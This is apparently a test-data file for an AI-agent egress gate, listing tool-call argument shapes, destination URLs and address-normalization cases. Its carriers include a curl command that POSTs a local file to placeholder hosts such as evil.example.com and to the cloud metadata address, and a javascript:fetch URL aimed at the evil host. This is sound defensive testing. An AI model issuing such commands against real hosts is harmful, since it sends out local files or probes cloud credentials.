// Test corpus for G10 "one egress policy, every carrier", written BEFORE the
// implementation exists (corpus-before-code). Design:
//   doc/roadmap/active/g10-egress-all-carriers-design.md  (sections 2, 3.3, 3.4, 3.5, 4.1, 4.2, 4.5)
//
// This file holds DATA only. It imports nothing from the feature. The tests
// that consume it are the 4.1 matrix (spawnSync against dist/cli.js, the
// ssrf-pins harness), the 4.2 false-positive rows, and the 4.5 normalization
// rows at engine level.
//
// Every argument shape below is the shape the REAL caller sends, with the
// evidence in `source`. Two evidence tiers are used and named as such:
//   repo:  a file:line inside this repository (a fixture captured from a live
//          session under src/__tests__/fixtures/gate-inputs, or a test that
//          already drives the real gate with that shape)
//   local: ~/.node9/hook-debug.log `STDIN:` lines and ~/.node9/audit.log rows
//          on the source machine, captured from live Claude Code sessions
//          (the same capture method gate-inputs/README.md prescribes). These
//          are cited when the repo holds no capture for that tool; the shape
//          is quoted verbatim in the note so a reader can re-verify.
// Where NEITHER tier had a capture, the note says so instead of inventing.
//
// Ignored-list status (design 3.3(d), the live-path door): computed with the
// engine's own matcher (picomatch, nocase) against the DEFAULT ignoredTools
// list in src/config/index.ts:268-287. Only `webfetch` among the carriers is
// on that list. The MCP-namespaced carriers are NOT: `matchesPattern` runs on
// the full `mcp__server__tool` name and no default pattern matches it. So on
// the shipped default, the door in 3.3(d) is what lets WebFetch through, and
// the MCP carriers already reach evaluatePolicy today (and still say allow,
// because the engine has no non-shell egress branch yet).

export interface CarrierRow {
  id: string;
  tool: string;
  args: Record<string, unknown>;
  /** Why the change must, or must not, see this row. */
  carrierNote: string;
  /** Where the argument shape was observed. */
  source: string;
}

export interface DestinationRow {
  id: string;
  url: string;
  kind:
    | 'unknown'
    | 'default-allowlisted'
    | 'user-allowlisted'
    | 'user-denied'
    | 'private-v4'
    | 'private-v6'
    | 'floor';
}

export interface Carrier {
  id: string;
  tool: string;
  /** Returns the real caller's args shape with `url` in the field the tool declares. */
  build: (url: string) => Record<string, unknown>;
  /** Evidence for the shape, plus the tool's status on the DEFAULT ignoredTools list. */
  source: string;
}

export interface NormalizationRow {
  id: string;
  /** Spellings of one address as the two extractors hand them over. */
  spellings: string[];
  /** The allow/deny list entry they must all be compared against. */
  listEntry: string;
  /** What normalizeIpLiteral folds each spelling to (measured), and whether they agree. */
  note: string;
}

// ── 4.1 carriers ───────────────────────────────────────────────────────────

/**
 * The carriers of the 4.1 matrix. For one destination and one egress config,
 * every `build(url)` must yield the SAME verdict through the real gate.
 * Today the two Bash rows say deny under mode:block and the five tool rows
 * say allow, which is the gap.
 */
export const CARRIERS: Carrier[] = [
  {
    id: 'bash-curl-post-file',
    tool: 'Bash',
    build: (url) => ({ command: `curl -X POST ${url} -d @/tmp/x` }),
    source:
      'repo: src/__tests__/fixtures/gate-inputs/claude-bash.json (captured Claude Code envelope, tool_input {command, description}); ' +
      'command text after src/__tests__/managed-mandate-ignoredtools-floor.spec.ts:41 and src/__tests__/ssrf-pins.spec.ts:44-53 (the harness this matrix reuses). ' +
      'ignoredTools: NOT on the default list. Shell extractor yields {host, binary: "curl"} (measured 2026-09-21).',
  },
  {
    id: 'bash-wget',
    tool: 'Bash',
    build: (url) => ({ command: `wget ${url}` }),
    source:
      'repo: src/__tests__/fixtures/gate-inputs/claude-bash.json (shape); wget command text after src/__tests__/core.test.ts:329. ' +
      'ignoredTools: NOT on the default list. Shell extractor yields {host, binary: "wget"} (measured 2026-09-21).',
  },
  {
    id: 'webfetch',
    tool: 'WebFetch',
    build: (url) => ({ url, prompt: 'x' }),
    source:
      'local: ~/.node9/hook-debug.log STDIN, 1537 captures, shape {"url":"https://...","prompt":"..."}; ' +
      'repo: src/__tests__/unoverridable-block.spec.ts:33-36 drives evaluatePolicy("WebFetch", {url}). ' +
      'DESTINATION_ARGS path: url. ignoredTools: ON the default list ("webfetch", src/config/index.ts:278); this is the carrier the 3.3(d) door exists for.',
  },
  {
    id: 'mcp-fetch',
    tool: 'mcp__fetch__fetch',
    build: (url) => ({ url }),
    source:
      'local: ~/.node9/audit.log has 17 rows with "tool":"mcp__fetch__fetch","mcpServer":"fetch" and argsPreview = the bare URL. ' +
      'CAVEAT: those rows are dated 2026-09-15 and carry evil.example.com / the metadata address, i.e. they are node9 probe sessions, not an ordinary user session; ' +
      'no {url} tool_input capture exists in hook-debug.log or in the repo. The name is real (bareToolName strips "mcp__fetch__" to "fetch", which the table lists with paths url|uri); ' +
      'the {url} shape is taken from the table and from the reference MCP fetch server, not from a live capture. ' +
      'ignoredTools: NOT on the default list (matchesPattern sees the full namespaced name).',
  },
  {
    id: 'mcp-browser-navigate',
    tool: 'mcp__Claude_Browser__navigate',
    build: (url) => ({ tabId: 'seed', url }),
    source:
      'local: ~/.node9/hook-debug.log STDIN, shape {"tabId":"seed","url":"https://..."}; ~/.node9/audit.log 184 rows "tool":"mcp__Claude_Browser__navigate". ' +
      'repo: packages/policy-engine/src/egress/destinations.spec.ts:38-40 (A3) drives the namespaced name; src/__tests__/hook-payload.spec.ts:168 shows canonicalToolName leaves browser names untouched. ' +
      'DESTINATION_ARGS path: url. ignoredTools: NOT on the default list.',
  },
  {
    id: 'mcp-browser-preview-start',
    tool: 'mcp__Claude_Browser__preview_start',
    build: (url) => ({ url }),
    source:
      'local: ~/.node9/hook-debug.log STDIN, 46 captures, shape {"url":"https://..."}; ~/.node9/audit.log 80 rows, argsPreview = the bare URL. ' +
      'repo: packages/policy-engine/src/egress/destinations.spec.ts:27 (A2) drives preview_start {url}. ' +
      'DESTINATION_ARGS path: url. ignoredTools: NOT on the default list.',
  },
  {
    id: 'mcp-browser-batch',
    tool: 'mcp__Claude_Browser__browser_batch',
    build: (url) => ({
      actions: [
        { name: 'navigate', input: { url } },
        { name: 'get_page_text', input: { max_chars: 12000 } },
      ],
    }),
    source:
      'local: ~/.node9/hook-debug.log STDIN, 264 captures, shape {"actions":[{"name":"navigate","input":{"url":"https://node9.ai/"}},{"name":"get_page_text","input":{"max_chars":12000}}]}; ' +
      '~/.node9/audit.log 253 rows "tool":"mcp__Claude_Browser__browser_batch". ' +
      'repo: packages/policy-engine/src/egress/destinations.spec.ts:28-35 (A2) drives actions[].input.url. ' +
      'DESTINATION_ARGS path: actions[].input.url. ignoredTools: NOT on the default list. ' +
      'The second action carries no url on purpose: valuesAt must skip it, not throw.',
  },
];

// ── 4.1 destinations ───────────────────────────────────────────────────────

/** One URL per kind. The consuming test sets policy.allow/deny for the two user-* rows. */
export const DESTINATIONS: DestinationRow[] = [
  { id: 'unknown', url: 'https://evil.example.com/x', kind: 'unknown' },
  { id: 'default-allowlisted', url: 'https://api.github.com/x', kind: 'default-allowlisted' },
  { id: 'user-allowlisted', url: 'https://corp.example/x', kind: 'user-allowlisted' },
  { id: 'user-denied', url: 'https://blocked.example/x', kind: 'user-denied' },
  { id: 'private-v4', url: 'http://127.0.0.1:3000/x', kind: 'private-v4' },
  { id: 'private-v6', url: 'http://[::1]:3000/x', kind: 'private-v6' },
  { id: 'floor', url: 'http://169.254.169.254/latest/meta-data/', kind: 'floor' },
];

// The premise behind the 'default-allowlisted' row (that host really being on
// DEFAULT_EGRESS_ALLOWLIST) is asserted in the integration test's beforeAll,
// not here. A throw at import time failed module load for both consuming
// files with a stack pointing at this fixture instead of at the test that
// cares, and it made this file import the feature package it claims not to.

/** Users' list entries the 4.1 test writes into policy.allow / policy.deny. */
export const USER_ALLOW_ENTRY = 'corp.example';
export const USER_DENY_ENTRY = 'blocked.example';

// ── 4.2 rows the change must NOT see ───────────────────────────────────────

const EVIL = 'https://evil.example.com';

/**
 * Rows that must be INVISIBLE to the change. For every row, the decision
 * through the real gate is byte-identical before and after the change, under
 * every egress config. Two families:
 *   - the tool is not in DESTINATION_ARGS (the closed list is closed)
 *   - the tool is in the table but the value is not a destination (hostOf → null)
 * One row (bash-echo-url) is not "no verdict" but "unchanged": it is a shell
 * command and takes the shell path exactly as today; the shell extractor
 * returns no destination for it (measured 2026-09-21), so egress says nothing.
 */
export const NO_VERDICT_ROWS: CarrierRow[] = [
  {
    id: 'grep-pattern-is-url',
    tool: 'Grep',
    args: { pattern: `${EVIL}/x` },
    carrierNote:
      'Grep is not in DESTINATION_ARGS. A pattern that is a full https URL to an evil host is a SEARCH, not a fetch. ' +
      'This is the row that proves the closed list is closed (design 4.2). Also on the default ignoredTools list ("grep").',
    source:
      'repo: src/__tests__/jail-gauntlet.integration.test.ts:121 probe(home, "Grep", {pattern}); src/__tests__/dlp-scan-ignored-floor.spec.ts:81 authorizeHeadless("Grep", {pattern}). ' +
      'No STDIN capture of Grep in ~/.node9/hook-debug.log; ~/.node9/audit.log has 2136 Grep rows (checkedBy: ignored).',
  },
  {
    id: 'read-file-path-looks-like-url',
    tool: 'Read',
    args: { file_path: `/tmp/${EVIL.replace('https://', '')}/index.html`, offset: 1, limit: 40 },
    carrierNote:
      'Read is not in DESTINATION_ARGS. A file_path containing a URL-like string is a local path. Also on the default ignoredTools list ("read").',
    source:
      'repo: src/__tests__/fixtures/gate-inputs/claude-read.json (captured Claude Code envelope, tool_input {file_path, offset, limit}); ' +
      'local: ~/.node9/hook-debug.log STDIN shape {"file_path":"/home/...","offset":186,"limit":130}.',
  },
  {
    id: 'agent-prompt-mentions-url',
    tool: 'Agent',
    args: {
      description: 'Check the evil host',
      prompt: `Read ${EVIL}/x and summarize it. Do not fetch anything else.`,
    },
    carrierNote:
      'Agent (Claude Code renamed Task to Agent) is not in DESTINATION_ARGS. A prompt is free text: quoting a URL and instructing to fetch it are the same bytes, ' +
      'the worst of the six false-positive families in the comment above DESTINATION_ARGS. Also on the default ignoredTools list ("agent", "task*").',
    source:
      'local: ~/.node9/hook-debug.log STDIN, 137 captures, shape {"description":"...","prompt":"..."}; 0 captures of a tool named Task on this machine. ' +
      'repo: packages/policy-engine/src/egress/destinations.spec.ts:51-52 (A4) lists Agent and Task as not judged; no repo capture of the Agent payload shape.',
  },
  {
    id: 'write-content-contains-url',
    tool: 'Write',
    args: {
      file_path: '/tmp/notes.md',
      content: `# Links\n\nSee ${EVIL}/x for the writeup.\n`,
    },
    carrierNote:
      'Write is not in DESTINATION_ARGS. content is a file body; a URL inside it is text being written, not a destination being reached. Not on the ignoredTools list, so it reaches evaluatePolicy today and must keep saying allow.',
    source:
      'local: ~/.node9/hook-debug.log STDIN, 80 captures, shape {"file_path":"/home/...","content":"..."}; ' +
      'repo: src/__tests__/log.integration.test.ts:328-331 tool_name Write, tool_input {file_path, content}.',
  },
  {
    id: 'websearch-query-contains-url',
    tool: 'WebSearch',
    args: { query: `site:evil.example.com ${EVIL}/x` },
    carrierNote:
      'WebSearch is not in DESTINATION_ARGS (the engine reaches a search provider, not the URL in the query). Also on the default ignoredTools list ("websearch").',
    source:
      'local: ~/.node9/hook-debug.log STDIN, 297 captures, shape {"query":"..."}. No repo test drives WebSearch with tool_input; ' +
      'src/__tests__/ci-check.spec.ts:346 only names it in a --disallowedTools string.',
  },
  {
    id: 'bash-echo-url',
    tool: 'Bash',
    args: { command: `echo ${EVIL}` },
    carrierNote:
      'UNCHANGED, not "no verdict by construction": Bash is a shell carrier and is judged by the SHELL path exactly as today. ' +
      'extractShellDestinations("echo https://evil.example.com") returns [] (measured 2026-09-21), so the egress branch has nothing to evaluate; ' +
      'the decision must equal the pre-change decision under every config. The G10 extractor never sees Bash (not in the table).',
    source:
      'repo: src/__tests__/fixtures/gate-inputs/claude-bash.json (shape {command, description}); src/__tests__/ssrf-pins.spec.ts:44-53 (harness).',
  },
  {
    id: 'webfetch-not-a-url',
    tool: 'WebFetch',
    args: { url: 'not a url', prompt: 'x' },
    carrierNote:
      'In the table, but the value is not a destination: new URL("not a url") throws, hostOf returns null, extractToolDestinations yields [] and no evaluateEgress call happens. Mirrors destinations.spec.ts B4.',
    source:
      'local: ~/.node9/hook-debug.log STDIN shape {"url","prompt"}; repo: packages/policy-engine/src/egress/destinations.spec.ts:123-127 (B4, same values).',
  },
  {
    id: 'webfetch-relative-url',
    tool: 'WebFetch',
    args: { url: '/x', prompt: 'x' },
    carrierNote:
      'In the table, but a relative URL has no host: new URL("/x") throws without a base, hostOf returns null, no verdict (design 4.2 "relative or malformed url").',
    source:
      'local: ~/.node9/hook-debug.log STDIN shape {"url","prompt"}; value measured 2026-09-21: new URL("/x") throws.',
  },
  {
    id: 'webfetch-data-scheme',
    tool: 'WebFetch',
    args: { url: 'data:text/html,evil.example.com', prompt: 'x' },
    carrierNote:
      'In the table, but a data: URL carries no host: new URL(...).hostname is "" (measured), hostOf returns "" which is falsy, the value falls out. Mirrors destinations.spec.ts B3c.',
    source:
      'local: ~/.node9/hook-debug.log STDIN shape {"url","prompt"}; repo: packages/policy-engine/src/egress/destinations.spec.ts:107-118 (B3c).',
  },
  {
    id: 'webfetch-javascript-scheme',
    tool: 'WebFetch',
    args: { url: `javascript:fetch('${EVIL}/x')`, prompt: 'x' },
    carrierNote:
      'In the table, but a javascript: URL carries no host: hostname is "" (measured), falls out of hostOf. The evil URL sits in the PATH, and the extractor reads the host, never the path. Mirrors destinations.spec.ts B3c.',
    source:
      'local: ~/.node9/hook-debug.log STDIN shape {"url","prompt"}; repo: packages/policy-engine/src/egress/destinations.spec.ts:107-118 (B3c).',
  },
  {
    id: 'browser-batch-no-url',
    tool: 'mcp__Claude_Browser__browser_batch',
    args: {
      actions: [
        { name: 'computer', input: { action: 'screenshot' } },
        { name: 'get_page_text', input: { max_chars: 12000 } },
      ],
    },
    carrierNote:
      'In the table (path actions[].input.url), but no action carries a url: valuesAt walks the array, finds no string at input.url, returns []. No verdict, and it must not throw.',
    source:
      'local: ~/.node9/hook-debug.log STDIN shape {"actions":[{"name":...,"input":{...}}]} (the url-less actions are the get_page_text element of the captured batch and the computer action from the tool schema).',
  },
  {
    id: 'unlisted-mcp-tool-with-url-arg',
    tool: 'mcp__notes__save',
    args: { url: `${EVIL}/x`, title: 'x' },
    carrierNote:
      'NOT in DESTINATION_ARGS (bareToolName gives "save"), yet the argument is literally named url. It must be invisible BECAUSE the table is closed, not because the key differs: ' +
      'a tool is covered when its network semantics are declared by its name (founder call 2026-09-08 recorded above the table). Not on the ignoredTools list either, so it reaches evaluatePolicy today and must keep saying allow.',
    source:
      'No capture: this is a made-up tool by design (the row exists to prove the list, not a shape). Envelope shape follows src/__tests__/fixtures/gate-inputs/claude-mcp-tool.json (namespaced mcp__server__tool with a flat tool_input).',
  },
];

// ── 3.4 / 4.5 normalization rows ───────────────────────────────────────────

/**
 * Spellings of one address as the two extractors hand them over, against one
 * list entry. Folded values were MEASURED with normalizeIpLiteral
 * (packages/policy-engine/src/egress/ssrf.ts) on 2026-09-21; each note states
 * the fold and whether the row can assert agreement.
 *
 * How each spelling arises today (measured):
 *   shell extractor:  curl http://[::1]:3000/x        -> host "[::1]"  (brackets kept)
 *                     wget https://EVIL.example.com./x -> host "evil.example.com." (lowercased, dot kept)
 *   hostOf (tools):   http://[::1]:3000/x             -> "::1"   (brackets stripped)
 *                     http://[::ffff:127.0.0.1]/x     -> "::ffff:7f00:1" (the URL parser rewrites the mapped form)
 *                     https://EVIL.example.com./x     -> "evil.example.com."
 * And today hostMatches compares the raw lowercase string, so
 *   hostMatches("[::1]", "::1") === false and
 *   hostMatches("evil.example.com.", "evil.example.com") === false.
 */
export const NORMALIZATION_ROWS: NormalizationRow[] = [
  // The first draft of this row grouped "[::1]", "::1", "::ffff:127.0.0.1" and
  // "127.0.0.1" under one list entry, following design 3.4 revision 1. The
  // measurement contradicted it: "::1" is a different address from
  // 127.0.0.1 and does not fold to it. The design was corrected and the row
  // is split so the data itself cannot invite the wrong assertion.
  {
    id: 'v6-loopback-brackets',
    spellings: ['[::1]', '::1'],
    listEntry: '::1',
    note:
      'Measured folds: "[::1]" -> "::1"; "::1" -> "::1". Agreement holds. ' +
      'The shell extractor keeps the brackets and hostOf strips them, and today hostMatches compares raw strings: ' +
      'hostMatches("[::1]", "::1") is false, so the bracketed spelling is red on the parent under deny ["::1"]. ' +
      'isPrivateHost is true for both (post-#350), so assert the allow side with allowPrivate:false.',
  },
  {
    id: 'v4-loopback-mapped-spellings',
    spellings: ['::ffff:127.0.0.1', '::ffff:7f00:1', '127.0.0.1'],
    listEntry: '127.0.0.1',
    note:
      'Measured folds: "::ffff:127.0.0.1" -> "127.0.0.1"; "::ffff:7f00:1" -> "127.0.0.1"; "127.0.0.1" -> "127.0.0.1". Agreement holds. ' +
      '"::ffff:7f00:1" is what hostOf actually yields for http://[::ffff:127.0.0.1]/ (the URL parser rewrites the mapped form), ' +
      'so it is the spelling a tool carrier really produces. Red on the parent for both mapped spellings under deny ["127.0.0.1"]. ' +
      'isPrivateHost is true for all three, so assert the allow side with allowPrivate:false.',
  },
  {
    id: 'hostname-case-and-trailing-dot',
    spellings: ['EVIL.example.com.', 'evil.example.com'],
    listEntry: 'evil.example.com',
    note:
      'Measured: normalizeIpLiteral returns null for both (they are hostnames, not IP literals), so the fold is the hostname branch of the proposed canonicalHost: lowercase, trailing dot dropped, giving "evil.example.com" for both. ' +
      'Both extractors already lowercase (URL parser and shell extractor), so the parent disagreement is only the trailing dot: hostMatches("evil.example.com.", "evil.example.com") is false today (measured). ' +
      'Agreement can be asserted once canonicalHost exists; red on the parent for the dotted spelling under deny ["evil.example.com"].',
  },
  {
    id: 'ula-v6-brackets',
    spellings: ['[fd00::1]', 'fd00::1'],
    listEntry: 'fd00::1',
    note:
      'Measured folds: "[fd00::1]" -> "fd00::1"; "fd00::1" -> "fd00::1". Agreement holds. ' +
      'This is the shell-vs-tool bracket disagreement in its purest form: the shell extractor keeps the brackets, hostOf strips them, and today hostMatches compares raw strings. ' +
      'Red on the parent for the bracketed spelling under deny ["fd00::1"]. ' +
      'Ordering caveat for the consuming test (measured): isPrivateHost is true for both spellings (classifySsrf returns null, fc00::/7 is not a tier, but isPrivateHost has its own ULA check). ' +
      'evaluateEgress consults deny BEFORE the allowPrivate skip, so a deny row is never masked; an allow row under allowPrivate:true is skipped before the list is read, so use allowPrivate:false when asserting the allow side.',
  },
];
